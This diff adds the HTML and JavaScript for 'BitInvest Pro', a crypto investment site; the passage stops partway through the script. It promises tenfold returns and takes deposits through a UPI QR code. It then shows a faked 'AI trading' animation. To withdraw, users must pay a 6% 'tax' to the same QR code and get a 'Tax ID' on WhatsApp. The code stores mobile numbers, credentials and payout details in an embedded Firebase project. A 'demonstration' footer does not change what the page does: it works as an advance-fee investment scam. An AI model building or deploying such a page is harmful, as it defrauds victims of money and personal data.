@@ -1,0 +1,1560 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BitInvest Pro - Bitcoin Trading Platform</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #0c0e2a 0%, #1a1f4b 100%);
+            color: #fff;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+            border-bottom: 1px solid #2a2f5d;
+            margin-bottom: 30px;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 24px;
+            font-weight: 700;
+            color: #4cc2ff;
+        }
+        
+        .logo i {
+            color: #f7931a;
+        }
+        
+        .auth-buttons {
+            display: flex;
+            gap: 15px;
+        }
+        
+        .btn {
+            padding: 10px 20px;
+            border-radius: 6px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            border: none;
+        }
+        
+        .btn-login {
+            background: #4cc2ff;
+            color: #0c0e2a;
+        }
+        
+        .btn-register {
+            background: #f7931a;
+            color: #0c0e2a;
+        }
+        
+        .btn:hover {
+            opacity: 0.9;
+            transform: translateY(-2px);
+        }
+        
+        .page {
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        .active-page {
+            display: block;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .hero {
+            text-align: center;
+            padding: 40px 0;
+            margin-bottom: 40px;
+        }
+        
+        .hero h1 {
+            font-size: 48px;
+            margin-bottom: 20px;
+            background: linear-gradient(90deg, #4cc2ff 0%, #f7931a 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .hero p {
+            font-size: 18px;
+            color: #9aa1bf;
+            max-width: 700px;
+            margin: 0 auto 30px;
+        }
+        
+        .login-content {
+            background: #1a1f4b;
+            padding: 30px;
+            border-radius: 12px;
+            width: 400px;
+            max-width: 90%;
+            margin: 0 auto;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        }
+        
+        .login-header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        
+        .login-header h2 {
+            font-size: 28px;
+            margin-bottom: 10px;
+            color: #4cc2ff;
+        }
+        
+        .login-header p {
+            color: #9aa1bf;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #9aa1bf;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border-radius: 6px;
+            background: #252b5c;
+            border: 1px solid #363c74;
+            color: #fff;
+        }
+        
+        .otp-container {
+            display: flex;
+            gap: 10px;
+        }
+        
+        .otp-container input {
+            text-align: center;
+            font-size: 20px;
+            font-weight: 600;
+        }
+        
+        .btn-get-otp {
+            background: #f7931a;
+            color: #0c0e2a;
+            width: 100%;
+            margin-top: 10px;
+        }
+        
+        .btn-login-form {
+            background: #4cc2ff;
+            color: #0c0e2a;
+            width: 100%;
+            margin-top: 15px;
+        }
+        
+        .plans-section {
+            margin-bottom: 50px;
+        }
+        
+        .section-title {
+            text-align: center;
+            margin-bottom: 40px;
+            font-size: 32px;
+            color: #4cc2ff;
+        }
+        
+        .plans-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 25px;
+        }
+        
+        .plan-card {
+            background: #1a1f4b;
+            border-radius: 12px;
+            padding: 25px;
+            text-align: center;
+            transition: transform 0.3s;
+            border: 1px solid #2a2f5d;
+        }
+        
+        .plan-card:hover {
+            transform: translateY(-5px);
+            border-color: #4cc2ff;
+        }
+        
+        .plan-card h3 {
+            font-size: 22px;
+            margin-bottom: 15px;
+            color: #f7931a;
+        }
+        
+        .plan-amount {
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 15px;
+            color: #4cc2ff;
+        }
+        
+        .plan-profit {
+            font-size: 20px;
+            color: #2ecc71;
+            margin-bottom: 20px;
+        }
+        
+        .btn-invest {
+            background: #f7931a;
+            color: #0c0e2a;
+            width: 100%;
+        }
+        
+        .trading-section {
+            background: #1a1f4b;
+            border-radius: 12px;
+            padding: 30px;
+            margin-bottom: 50px;
+        }
+        
+        .trading-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #2a2f5d;
+        }
+        
+        .trading-header h2 {
+            color: #4cc2ff;
+        }
+        
+        .user-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .user-balance {
+            background: #252b5c;
+            padding: 8px 15px;
+            border-radius: 6px;
+            font-weight: 600;
+            color: #4cc2ff;
+        }
+        
+        .trading-container {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+        }
+        
+        .trading-chart {
+            background: #252b5c;
+            border-radius: 12px;
+            padding: 20px;
+            height: 300px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 18px;
+            color: #9aa1bf;
+        }
+        
+        .trading-actions {
+            background: #252b5c;
+            border-radius: 12px;
+            padding: 20px;
+        }
+        
+        .trading-actions h3 {
+            margin-bottom: 20px;
+            text-align: center;
+            color: #f7931a;
+        }
+        
+        .btn-trade {
+            background: #2ecc71;
+            color: #0c0e2a;
+            width: 100%;
+            margin-top: 15px;
+        }
+        
+        .deposit-section {
+            background: #1a1f4b;
+            border-radius: 12px;
+            padding: 30px;
+            margin-bottom: 50px;
+        }
+        
+        .deposit-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .deposit-header h2 {
+            color: #4cc2ff;
+            margin-bottom: 10px;
+        }
+        
+        .deposit-container {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+        }
+        
+        .qr-code {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .qr-code img {
+            max-width: 250px;
+            border-radius: 12px;
+            margin-bottom: 15px;
+        }
+        
+        .deposit-form {
+            background: #252b5c;
+            padding: 20px;
+            border-radius: 12px;
+        }
+        
+        .btn-verify {
+            background: #f7931a;
+            color: #0c0e2a;
+            width: 100%;
+            margin-top: 15px;
+        }
+        
+        .withdrawal-section {
+            background: #1a1f4b;
+            border-radius: 12px;
+            padding: 30px;
+            margin-bottom: 50px;
+        }
+        
+        .withdrawal-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .withdrawal-header h2 {
+            color: #4cc2ff;
+            margin-bottom: 10px;
+        }
+        
+        .withdrawal-options {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+            margin-bottom: 30px;
+        }
+        
+        .withdrawal-option {
+            background: #252b5c;
+            padding: 20px;
+            border-radius: 12px;
+            text-align: center;
+        }
+        
+        .withdrawal-option h3 {
+            color: #f7931a;
+            margin-bottom: 15px;
+        }
+        
+        .tax-section {
+            background: #252b5c;
+            padding: 20px;
+            border-radius: 12px;
+            margin-top: 30px;
+            display: none;
+        }
+        
+        .tax-section h3 {
+            color: #e74c3c;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+        
+        .btn-pay-tax {
+            background: #e74c3c;
+            color: #fff;
+            width: 100%;
+            margin-top: 15px;
+        }
+        
+        .trading-animation {
+            text-align: center;
+            padding: 30px;
+            background: #1a1f4b;
+            border-radius: 12px;
+            margin: 0 auto;
+            max-width: 800px;
+        }
+        
+        .trading-animation i {
+            font-size: 60px;
+            color: #4cc2ff;
+            margin-bottom: 20px;
+            animation: pulse 1.5s infinite;
+        }
+        
+        .progress-container {
+            width: 100%;
+            background-color: #252b5c;
+            border-radius: 10px;
+            margin: 20px 0;
+            overflow: hidden;
+            height: 20px;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #4cc2ff 0%, #f7931a 100%);
+            border-radius: 10px;
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+        
+        .trading-stats {
+            display: flex;
+            justify-content: space-around;
+            margin: 25px 0;
+            background: #252b5c;
+            padding: 20px;
+            border-radius: 12px;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+        
+        .stat-box {
+            text-align: center;
+            min-width: 120px;
+        }
+        
+        .stat-value {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 8px;
+        }
+        
+        .stat-label {
+            font-size: 14px;
+            color: #9aa1bf;
+        }
+        
+        .profit {
+            color: #2ecc71;
+        }
+        
+        .loss {
+            color: #e74c3c;
+        }
+        
+        .countdown-timer {
+            font-size: 28px;
+            font-weight: bold;
+            color: #f7931a;
+            margin: 15px 0;
+            background: #252b5c;
+            padding: 15px;
+            border-radius: 12px;
+            display: inline-block;
+            min-width: 100px;
+        }
+        
+        .trading-graph-container {
+            width: 100%;
+            height: 250px;
+            background: #252b5c;
+            border-radius: 12px;
+            margin: 25px 0;
+            padding: 15px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .trading-graph {
+            width: 100%;
+            height: 100%;
+            position: relative;
+        }
+        
+        .graph-line {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 1px;
+            background: rgba(255, 255, 255, 0.2);
+        }
+        
+        .graph-fill {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: linear-gradient(to top, rgba(76, 194, 255, 0.2), transparent);
+            z-index: 1;
+        }
+        
+        .graph-path {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 2;
+        }
+        
+        .graph-point {
+            position: absolute;
+            width: 8px;
+            height: 8px;
+            background: #4cc2ff;
+            border-radius: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 3;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        
+        .whatsapp-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: #25D366;
+            color: #fff;
+            padding: 12px 20px;
+            border-radius: 6px;
+            text-decoration: none;
+            font-weight: 600;
+            margin-top: 15px;
+            justify-content: center;
+        }
+        
+        footer {
+            text-align: center;
+            padding: 30px 0;
+            color: #9aa1bf;
+            border-top: 1px solid #2a2f5d;
+            margin-top: 50px;
+        }
+        
+        .navigation-buttons {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 30px;
+        }
+        
+        .credentials-box {
+            background: #252b5c;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+            display: none;
+        }
+        
+        .credentials-box p {
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+        
+        .credentials-box strong {
+            color: #4cc2ff;
+        }
+        
+        .redeem-section {
+            background: #252b5c;
+            padding: 20px;
+            border-radius: 12px;
+            margin-top: 20px;
+            display: none;
+        }
+        
+        .new-user-section {
+            text-align: center;
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #2a2f5d;
+        }
+        
+        .new-user-section p {
+            margin-bottom: 15px;
+            color: #9aa1bf;
+        }
+        
+        @media (max-width: 768px) {
+            .trading-container,
+            .deposit-container,
+            .withdrawal-options {
+                grid-template-columns: 1fr;
+            }
+            
+            .navigation-buttons {
+                flex-direction: column;
+                gap: 15px;
+            }
+            
+            .navigation-buttons .btn {
+                width: 100%;
+            }
+            
+            .trading-stats {
+                flex-direction: column;
+                gap: 15px;
+            }
+            
+            .trading-animation {
+                padding: 20px;
+            }
+            
+            .countdown-timer {
+                font-size: 24px;
+                padding: 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo">
+                <i class="fab fa-bitcoin"></i>
+                <span>BitInvest Pro</span>
+            </div>
+            <div class="auth-buttons">
+                <button class="btn btn-login" id="logoutBtn" style="display: none;">Logout</button>
+            </div>
+        </header>
+
+        <!-- Login Page -->
+        <div class="page active-page" id="login-page">
+            <div class="hero">
+                <h1>Advanced Bitcoin Trading Platform</h1>
+                <p>Join thousands of successful traders who have multiplied their investments with our AI-powered trading system. Start with as little as ₹149 and get 10x returns.</p>
+            </div>
+
+            <div class="login-content">
+                <div class="login-header">
+                    <h2>Login to Your Account</h2>
+                    <p>Enter your mobile number to receive OTP</p>
+                </div>
+                <div class="form-group">
+                    <label for="mobileNumber">Mobile Number</label>
+                    <input type="text" id="mobileNumber" placeholder="Enter your mobile number">
+                </div>
+                <div class="form-group">
+                    <label for="otp">OTP</label>
+                    <div class="otp-container">
+                        <input type="text" id="otp1" maxlength="1" readonly>
+                        <input type="text" id="otp2" maxlength="1" readonly>
+                        <input type="text" id="otp3" maxlength="1" readonly>
+                        <input type="text" id="otp4" maxlength="1" readonly>
+                        <input type="text" id="otp5" maxlength="1" readonly>
+                        <input type="text" id="otp6" maxlength="1" readonly>
+                    </div>
+                </div>
+                <button class="btn btn-get-otp" id="getOtpBtn">Get OTP</button>
+                
+                <div id="credentialsSection" style="display: none;">
+                    <div class="form-group">
+                        <label for="userId">User ID</label>
+                        <input type="text" id="userId" placeholder="Enter your User ID">
+                    </div>
+                    <div class="form-group">
+                        <label for="password">Password</label>
+                        <input type="password" id="password" placeholder="Enter your Password">
+                    </div>
+                </div>
+                
+                <button class="btn btn-login-form" id="loginFormBtn" style="display: none;">Login</button>
+                
+                <div id="credentialsInfo" class="credentials-box">
+                    <p><strong>Your login credentials have been generated:</strong></p>
+                    <p>User ID: <span id="generatedUserId"></span></p>
+                    <p>Password: <span id="generatedPassword"></span></p>
+                    <p>Please save these credentials for future logins.</p>
+                </div>
+
+                <div class="new-user-section">
+                    <p>New user? Don't have an account?</p>
+                    <a href="https://wa.link/nz2wrh" class="whatsapp-btn" target="_blank">
+                        <i class="fab fa-whatsapp"></i> Contact us on WhatsApp for Registration
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <!-- Plans Page -->
+        <div class="page" id="plans-page">
+            <h2 class="section-title">Investment Plans</h2>
+            <div class="plans-grid">
+                <div class="plan-card">
+                    <h3>Starter Plan</h3>
+                    <div class="plan-amount">₹149</div>
+                    <div class="plan-profit">Profit: ₹1499</div>
+                    <button class="btn btn-invest" data-amount="149">Invest Now</button>
+                </div>
+                <div class="plan-card">
+                    <h3>Basic Plan</h3>
+                    <div class="plan-amount">₹499</div>
+                    <div class="plan-profit">Profit: ₹4999</div>
+                    <button class="btn btn-invest" data-amount="499">Invest Now</button>
+                </div>
+                <div class="plan-card">
+                    <h3>Silver Plan</h3>
+                    <div class="plan-amount">₹999</div>
+                    <div class="plan-profit">Profit: ₹9999</div>
+                    <button class="btn btn-invest" data-amount="999">Invest Now</button>
+                </div>
+                <div class="plan-card">
+                    <h3>Gold Plan</h3>
+                    <div class="plan-amount">₹1999</div>
+                    <div class="plan-profit">Profit: ₹19999</div>
+                    <button class="btn btn-invest" data-amount="1999">Invest Now</button>
+                </div>
+                <div class="plan-card">
+                    <h3>Platinum Plan</h3>
+                    <div class="plan-amount">₹4999</div>
+                    <div class="plan-profit">Profit: ₹49999</div>
+                    <button class="btn btn-invest" data-amount="4999">Invest Now</button>
+                </div>
+                <div class="plan-card">
+                    <h3>Diamond Plan</h3>
+                    <div class="plan-amount">₹9999</div>
+                    <div class="plan-profit">Profit: ₹99999</div>
+                    <button class="btn btn-invest" data-amount="9999">Invest Now</button>
+                </div>
+            </div>
+
+            <div class="navigation-buttons">
+                <button class="btn btn-login" id="plans-to-login">Back to Login</button>
+            </div>
+        </div>
+
+        <!-- Deposit Page -->
+        <div class="page" id="deposit-page">
+            <div class="deposit-header">
+                <h2>Deposit Funds</h2>
+                <p>Scan the QR code to deposit funds for your investment</p>
+            </div>
+            <div class="deposit-container">
+                <div class="qr-code">
+                    <img src="https://i.ibb.co/nNV0Jzqr/IMG-20250830-WA0001-1.jpg" alt="Deposit QR Code">
+                    <p>Scan this QR code using your UPI app</p>
+                </div>
+                <div class="deposit-form">
+                    <div class="form-group">
+                        <label for="utrNumber">UTR Number</label>
+                        <input type="text" id="utrNumber" placeholder="Enter UTR Number">
+                    </div>
+                    <div class="form-group">
+                        <label for="depositAmount">Deposit Amount</label>
+                        <input type="text" id="depositAmount" readonly>
+                    </div>
+                    <button class="btn btn-verify" id="verifyBtn">Verify via WhatsApp</button>
+                    
+                    <div class="redeem-section" id="redeemSection">
+                        <div class="form-group">
+                            <label for="redeemCode">Redeem Code</label>
+                            <input type="text" id="redeemCode" placeholder="Enter redeem code from WhatsApp">
+                        </div>
+                        <button class="btn btn-verify" id="redeemBtn">Redeem</button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="navigation-buttons">
+                <button class="btn btn-login" id="deposit-to-plans">Back to Plans</button>
+            </div>
+        </div>
+
+        <!-- Trading Page -->
+        <div class="page" id="trading-page">
+            <div class="trading-header">
+                <h2>Bitcoin Trading</h2>
+                <div class="user-info">
+                    <div class="user-balance">Balance: ₹<span id="userBalance">0</span></div>
+                </div>
+            </div>
+            <div class="trading-container">
+                <div class="trading-chart">
+                    <p>Live Bitcoin Trading Chart (Fake Interface)</p>
+                </div>
+                <div class="trading-actions">
+                    <h3>Execute Trade</h3>
+                    <div class="form-group">
+                        <label for="investmentAmount">Investment Amount</label>
+                        <input type="text" id="investmentAmount" value="149" readonly>
+                    </div>
+                    <div class="form-group">
+                        <label for="expectedProfit">Expected Profit</label>
+                        <input type="text" id="expectedProfit" value="1499" readonly>
+                    </div>
+                    <button class="btn btn-trade" id="tradeBtn">Start Trading</button>
+                </div>
+            </div>
+
+            <div class="navigation-buttons">
+                <button class="btn btn-login" id="trading-to-deposit">Back to Deposit</button>
+            </div>
+        </div>
+
+        <!-- Trading Animation Page -->
+        <div class="page" id="trading-animation-page">
+            <div class="trading-animation">
+                <i class="fas fa-chart-line"></i>
+                <h2>AI Trading in Progress</h2>
+                <p>Our advanced AI is trading Bitcoin for you. Please wait...</p>
+                
+                <div class="countdown-timer" id="countdownTimer">30s</div>
+                
+                <div class="progress-container">
+                    <div class="progress-bar" id="progressBar"></div>
+                </div>
+                
+                <div class="trading-stats">
+                    <div class="stat-box">
+                        <div class="stat-value" id="currentAmount">₹0</div>
+                        <div class="stat-label">Current Value</div>
+                    </div>
+                    <div class="stat-box">
+                        <div class="stat-value" id="profitLoss">+0.00%</div>
+                        <div class="stat-label">Profit/Loss</div>
+                    </div>
+                    <div class="stat-box">
+                        <div class="stat-value" id="timeLeft">30s</div>
+                        <div class="stat-label">Time Remaining</div>
+                    </div>
+                </div>
+                
+                <div class="trading-graph-container">
+                    <div class="trading-graph" id="tradingGraph">
+                        <div class="graph-line"></div>
+                        <div class="graph-fill" id="graphFill"></div>
+                        <svg class="graph-path" id="graphPath" viewBox="0 0 100 100" preserveAspectRatio="none"></svg>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Withdrawal Page -->
+        <div class="page" id="withdrawal-page">
+            <div class="withdrawal-header">
+                <h2>Withdraw Funds</h2>
+                <p>Choose your withdrawal method</p>
+            </div>
+            <div class="withdrawal-options">
+                <div class="withdrawal-option">
+                    <h3>UPI Withdrawal</h3>
+                    <div class="form-group">
+                        <label for="upiId">UPI ID</label>
+                        <input type="text" id="upiId" placeholder="Enter your UPI ID">
+                    </div>
+                    <div class="form-group">
+                        <label for="withdrawAmount">Withdrawal Amount</label>
+                        <input type="text" id="withdrawAmount" readonly>
+                    </div>
+                    <button class="btn btn-trade" id="withdrawUpiBtn">Withdraw via UPI</button>
+                </div>
+                <div class="withdrawal-option">
+                    <h3>USDT Withdrawal</h3>
+                    <div class="form-group">
+                        <label for="usdtAddress">USDT Address</label>
+                        <input type="text" id="usdtAddress" placeholder="Enter your USDT Address">
+                    </div>
+                    <div class="form-group">
+                        <label for="usdtAmount">Withdrawal Amount</label>
+                        <input type="text" id="usdtAmount" readonly>
+                    </div>
+                    <button class="btn btn-trade" id="withdrawUsdtBtn">Withdraw via USDT</button>
+                </div>
+            </div>
+
+            <div class="tax-section" id="taxSection">
+                <h3>Pay Tax (6% of withdrawal amount)</h3>
+                <div class="form-group">
+                    <label for="taxAmount">Tax Amount</label>
+                    <input type="text" id="taxAmount" readonly>
+                </div>
+                <div class="qr-code">
+                    <img src="https://i.ibb.co/nNV0Jzqr/IMG-20250830-WA0001-1.jpg" alt="Tax Payment QR Code">
+                    <p>Scan this QR code to pay your tax</p>
+                </div>
+                <div class="form-group">
+                    <label for="taxId">Tax ID</label>
+                    <input type="text" id="taxId" placeholder="Enter Tax ID">
+                </div>
+                <button class="btn btn-pay-tax" id="payTaxBtn">Pay Tax</button>
+                <a href="https://wa.link/nz2wrh" class="whatsapp-btn" target="_blank">
+                    <i class="fab fa-whatsapp"></i> Get Tax ID via WhatsApp
+                </a>
+            </div>
+
+            <div class="navigation-buttons">
+                <button class="btn btn-login" id="withdrawal-to-trading">Back to Trading</button>
+            </div>
+        </div>
+
+        <footer>
+            <p>&copy; 2023 BitInvest Pro. All rights reserved. | Fake trading platform for demonstration purposes only</p>
+        </footer>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Firebase configuration
+            const firebaseConfig = {
+                apiKey: "AIzaSyAszG9js_6QEA1lar8QvVJp5dkZHIt_QTQ",
+                authDomain: "bitinvestpro-a18c1.firebaseapp.com",
+                databaseURL: "https://bitinvestpro-a18c1-default-rtdb.firebaseio.com",
+                projectId: "bitinvestpro-a18c1",
+                storageBucket: "bitinvestpro-a18c1.firebasestorage.app",
+                messagingSenderId: "452364425763",
+                appId: "1:452364425763:web:723959fb51e033f594af96",
+                measurementId: "G-WNDZWMKX3T"
+            };
+            
+            // Initialize Firebase
+            firebase.initializeApp(firebaseConfig);
+            const database = firebase.database();
+            
+            // User data save karne ke liye function
+            function saveUserData(userId, mobileNumber, data) {
+                const userRef = database.ref('users/' + userId);
+                userRef.set({
+                    mobileNumber: mobileNumber,
+                    createdAt: firebase.database.ServerValue.TIMESTAMP,
+                    ...data
+                }).then(() => {
+                    console.log("User data saved successfully!");
+                }).catch((error) => {
+                    console.error("Error saving user data: ", error);
+                });
+            }
+            
+            // User activity track karne ke liye function
+            function logUserActivity(userId, activityType, details) {
+                const activityRef = database.ref('userActivities/' + userId + '/' + Date.now());
+                activityRef.set({
+                    type: activityType,
+                    timestamp: firebase.database.ServerValue.TIMESTAMP,
+                    details: details
+                });
+            }
+            
+            // Investment data save karne ke liye function
+            function saveInvestmentData(userId, planAmount, planProfit) {
+                const investmentRef = database.ref('investments/' + userId + '/' + Date.now());
+                investmentRef.set({
+                    amount: planAmount,
+                    expectedProfit: planProfit,
+                    timestamp: firebase.database.ServerValue.TIMESTAMP,
+                    status: "pending"
+                });
+            }
+            
+            // Withdrawal request save karne ke liye function
+            function saveWithdrawalRequest(userId, method, amount, details) {
+                const withdrawalRef = database.ref('withdrawals/' + userId + '/' + Date.now());
+                withdrawalRef.set({
+                    method: method,
+                    amount: amount,
+                    details: details,
+                    timestamp: firebase.database.ServerValue.TIMESTAMP,
+                    status: "pending"
+                });
+            }
+
+            // Elements
+            const pages = document.querySelectorAll('.page');
+            const loginPage = document.getElementById('login-page');
+            const plansPage = document.getElementById('plans-page');
+            const depositPage = document.getElementById('deposit-page');
+            const tradingPage = document.getElementById('trading-page');
+            const tradingAnimationPage = document.getElementById('trading-animation-page');
+            const withdrawalPage = document.getElementById('withdrawal-page');
+            const logoutBtn = document.getElementById('logoutBtn');
+            
+            // Login elements
+            const getOtpBtn = document.getElementById('getOtpBtn');
+            const loginFormBtn = document.getElementById('loginFormBtn');
+            const credentialsSection = document.getElementById('credentialsSection');
+            const credentialsInfo = document.getElementById('credentialsInfo');
+            const generatedUserId = document.getElementById('generatedUserId');
+            const generatedPassword = document.getElementById('generatedPassword');
+            
+            // Plans elements
+            const investButtons = document.querySelectorAll('.btn-invest');
+            
+            // Deposit elements
+            const verifyBtn = document.getElementById('verifyBtn');
+            const redeemSection = document.getElementById('redeemSection');
+            const redeemBtn = document.getElementById('redeemBtn');
+            
+            // Trading elements
+            const tradeBtn = document.getElementById('tradeBtn');
+            
+            // Trading animation elements
+            const progressBar = document.getElementById('progressBar');
+            const currentAmount = document.getElementById('currentAmount');
+            const profitLoss = document.getElementById('profitLoss');
+            const timeLeft = document.getElementById('timeLeft');
+            const countdownTimer = document.getElementById('countdownTimer');
+            const graphPath = document.getElementById('graphPath');
+            const graphFill = document.getElementById('graphFill');
+            
+            // Withdrawal elements
+            const withdrawUpiBtn = document.getElementById('withdrawUpiBtn');
+            const withdrawUsdtBtn = document.getElementById('withdrawUsdtBtn');
+            const payTaxBtn = document.getElementById('payTaxBtn');
+            const taxSection = document.getElementById('taxSection');
+            
+            // Navigation buttons
+            const plansToLoginBtn = document.getElementById('plans-to-login');
+            const depositToPlansBtn = document.getElementById('deposit-to-plans');
+            const tradingToDepositBtn = document.getElementById('trading-to-deposit');
+            const withdrawalToTradingBtn = document.getElementById('withdrawal-to-trading');
+            
+            // OTP Elements
+            const mobileNumberInput = document.getElementById('mobileNumber');
+            const otpInputs = [
+                document.getElementById('otp1'),
+                document.getElementById('otp2'),
+                document.getElementById('otp3'),
+                document.getElementById('otp4'),
+                document.getElementById('otp5'),
+                document.getElementById('otp6')
+            ];
+            
+            // Credential Elements
+            const userIdInput = document.getElementById('userId');
+            const passwordInput = document.getElementById('password');
+            
+            // Redeem Element
+            const redeemCodeInput = document.getElementById('redeemCode');
+            
+            // Variables
+            let currentPlanAmount = 0;
+            let currentPlanProfit = 0;
+            let userBalance = 0;
+            let userId = '';
+            let password = '';
+            let redeemCode = '';
+            let tradingInterval;
+            
+            // Navigation functions
+            function showPage(pageId) {
+                pages.forEach(page => {
+                    page.classList.remove('active-page');
+                });
+                document.getElementById(pageId).classList.add('active-page');
+            }
+            
+            // Navigation buttons
+            plansToLoginBtn.addEventListener('click', function() {
+                showPage('login-page');
+            });
+            
+            depositToPlansBtn.addEventListener('click', function() {
+                showPage('plans-page');
+            });
+            
+            tradingToDepositBtn.addEventListener('click', function() {
+                showPage('deposit-page');
+            });
+            
+            withdrawalToTradingBtn.addEventListener('click', function() {
+                showPage('trading-page');
+                taxSection.style.display = 'none';
+            });
+            
+            // Get OTP button
+            getOtpBtn.addEventListener('click', function() {
+                const mobileNumber = mobileNumberInput.value;
+                
+                if (mobileNumber.length !== 10) {
+                    alert('Please enter a valid 10-digit mobile number');
+                    return;
+                }
+                
+                // Show loading for 2 seconds
+                getOtpBtn.textContent = 'Sending OTP...';
+                getOtpBtn.disabled = true;
+                
+                setTimeout(function() {
+                    // Generate random OTP
+                    const generatedOtp = Math.floor(100000 + Math.random() * 900000).toString();
+                    
+                    // Firebase mein OTP request save karein
+                    logUserActivity(`temp_${mobileNumber}`, "otp_request", {
+                        mobileNumber: mobileNumber,
+                        otp: generatedOtp
+                    });
+                    
+                    // Fill OTP fields automatically
+                    for (let i = 0; i < 6; i++) {
+                        otpInputs[i].value = generatedOtp[i];
+                    }
+                    
+                    getOtpBtn.textContent = 'OTP Sent!';
+                    
+                    // Generate user ID and password based on mobile number
+                    userId = `agentinvest₹${mobileNumber.slice(6)}`;
+                    password = `mypass${mobileNumber.slice(6)}`;
+                    
+                    // Show credentials section
+                    credentialsSection.style.display = 'block';
+                    loginFormBtn.style.display = 'block';
+                    
+                    setTimeout(function() {
+                        getOtpBtn.textContent = 'Get OTP';
+                        getOtpBtn.disabled = false;
+                    }, 2000);
+                    
+                }, 2000);
+            });
+            
+            // Login button
+            loginFormBtn.addEventListener('click', function() {
+                const enteredUserId = userIdInput.value;
+                const enteredPassword = passwordInput.value;
+                
+                if (enteredUserId !== userId || enteredPassword !== password) {
+                    // Failed login attempt track karein
+                    logUserActivity(enteredUserId, "login_failed", {
+                        reason: "invalid_credentials"
+                    });
+                    alert('Invalid User ID or Password. Please try again.');
+                    return;
+                }
+                
+                // Successful login track karein
+                logUserActivity(userId, "login_success", {});
+                
+                // User data save karein
+                saveUserData(userId, mobileNumberInput.value, {
+                    credentials: {
+                        userId: userId,
+                        password: password
+                    }
+                });
+                
+                // Show credentials info
+                generatedUserId.textContent = userId;
+                generatedPassword.textContent = password;
+                credentialsInfo.style.display = 'block';
+                
+                setTimeout(function() {
+                    // Show plans page
+                    showPage('plans-page');
+                    logoutBtn.style.display = 'block';
+                }, 3000);
+            });
+            
+            // Logout button
+            logoutBtn.addEventListener('click', function() {
+                showPage('login-page');
+                logoutBtn.style.display = 'none';
+                userBalance = 0;
+                
+                // Clear all fields
+                mobileNumberInput.value = '';
+                otpInputs.forEach(input => {
+                    input.value = '';
+                });
+                userIdInput.value = '';
+                passwordInput.value = '';
+                credentialsSection.style.display = 'none';
+                loginFormBtn.style.display = 'none';
+                credentialsInfo.style.display = 'none';
+            });
+            
+            // Invest buttons
+            investButtons.forEach(button => {
+                button.addEventListener('click', function() {
+                    currentPlanAmount = parseInt(button.getAttribute('data-amount'));
+                    currentPlanProfit = currentPlanAmount * 10;
+                    
+                    // Investment data save karein
+                    saveInvestmentData(userId, currentPlanAmount, currentPlanProfit);
+                    
+                    // Show deposit page
+                    showPage('deposit-page');
+                    
+                    // Set deposit amount
